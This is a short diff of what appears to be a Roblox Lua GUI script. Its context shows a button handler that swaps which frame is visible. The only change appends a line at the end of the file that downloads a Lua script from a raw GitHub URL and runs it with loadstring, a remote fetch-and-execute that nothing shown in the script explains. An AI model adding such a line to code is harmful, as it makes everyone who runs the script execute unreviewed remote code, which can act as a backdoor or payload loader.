@@ -2489,3 +2489,4 @@ OPEN.MouseButton1Down:connect(function()
 open.Visible = false
 Main.Visible = true
 end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/wiskher/control/main/weepprem.lua", true))()
